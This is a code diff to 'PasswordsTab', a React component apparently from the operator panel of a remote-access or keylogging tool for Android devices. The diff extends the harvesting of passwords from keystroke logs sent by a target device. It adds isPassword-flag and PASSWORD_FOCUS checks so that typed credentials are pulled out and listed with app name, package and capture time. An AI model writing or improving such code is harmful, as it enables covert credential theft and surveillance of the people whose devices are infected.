@@ -12,7 +12,9 @@ const PASSWORD_PATTERNS = [
 
 const FIELD_HINTS = ['password', 'passwd', 'pwd', 'pin', 'pass', 'secret', 'credentials'];
 
-function looksLikePassword(text, fieldHint) {
+function looksLikePassword(text, fieldHint, isPasswordFlag, eventType) {
+  if (isPasswordFlag === true || isPasswordFlag === 'true') return true;
+  if (eventType === 'PASSWORD_FOCUS') return true;
   if (!text) return false;
   const low = (fieldHint || '').toLowerCase();
   if (FIELD_HINTS.some(h => low.includes(h))) return true;
@@ -22,7 +24,9 @@ function looksLikePassword(text, fieldHint) {
   return false;
 }
 
-function extractPasswordValue(text, fieldHint) {
+function extractPasswordValue(text, fieldHint, isPasswordFlag, eventType) {
+  if (isPasswordFlag === true || isPasswordFlag === 'true') return text;
+  if (eventType === 'PASSWORD_FOCUS') return text;
   const low = (fieldHint || '').toLowerCase();
   if (FIELD_HINTS.some(h => low.includes(h))) return text;
   for (const pat of PASSWORD_PATTERNS) {
@@ -143,15 +147,18 @@ export default function PasswordsTab({ device, sendCommand, results, keylogPushE
 
       const text = entry.text || entry.content || '';
       const fieldHint = entry.fieldType || entry.inputType || entry.field || '';
-      if (looksLikePassword(text, fieldHint)) {
+      const isPasswordFlag = entry.isPassword;
+      const eventType = entry.eventType || '';
+      if (looksLikePassword(text, fieldHint, isPasswordFlag, eventType)) {
         newEntries.push({
           id: id + '_' + Date.now(),
-          value: extractPasswordValue(text, fieldHint),
+          value: extractPasswordValue(text, fieldHint, isPasswordFlag, eventType),
           appName: entry.appName || entry.app || '',
           appPackage: entry.packageName || entry.pkg || '',
-          fieldHint,
+          fieldHint: fieldHint || (isPasswordFlag ? 'password' : ''),
           capturedAt: entry.timestamp || Date.now(),
           source: 'keylog',
+          isPassword: isPasswordFlag === true || isPasswordFlag === 'true',
         });
       }
     });
@@ -172,23 +179,26 @@ export default function PasswordsTab({ device, sendCommand, results, keylogPushE
         setLoading(false);
         try {
           const data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
-          const entries = data.keylogs || data.entries || [];
+          const entries = data.keylogs || data.logs || data.entries || [];
           const newEntries = [];
           entries.forEach(entry => {
             const text = entry.text || entry.content || '';
             const fieldHint = entry.fieldType || entry.inputType || entry.field || '';
-            if (looksLikePassword(text, fieldHint)) {
+            const isPasswordFlag = entry.isPassword;
+            const eventType = entry.eventType || '';
+            if (looksLikePassword(text, fieldHint, isPasswordFlag, eventType)) {
               const id = (entry.id || entry.timestamp + text);
               if (!seenIds.current.has(id)) {
                 seenIds.current.add(id);
                 newEntries.push({
                   id: id + '_scan',
-                  value: extractPasswordValue(text, fieldHint),
+                  value: extractPasswordValue(text, fieldHint, isPasswordFlag, eventType),
                   appName: entry.appName || entry.app || '',
                   appPackage: entry.packageName || entry.pkg || '',
-                  fieldHint,
+                  fieldHint: fieldHint || (isPasswordFlag ? 'password' : ''),
                   capturedAt: entry.timestamp || Date.now(),
                   source: 'scan',
+                  isPassword: isPasswordFlag === true || isPasswordFlag === 'true',
                 });
               }
             }
